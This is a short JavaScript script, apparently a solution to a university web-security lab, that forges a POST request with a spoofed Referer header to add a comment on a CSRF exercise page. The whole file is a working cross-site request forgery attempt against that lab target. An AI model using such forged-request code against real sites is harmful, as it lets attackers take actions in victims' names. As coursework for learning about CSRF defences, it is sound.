const url = "https://webappsec.cs.ut.ee/csrf/comments_referer.php";
const commentToAdd = "FinalRemoteAttack";

const main = async () => {
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': url
        },
        body: "comment="+commentToAdd
    });
};

main();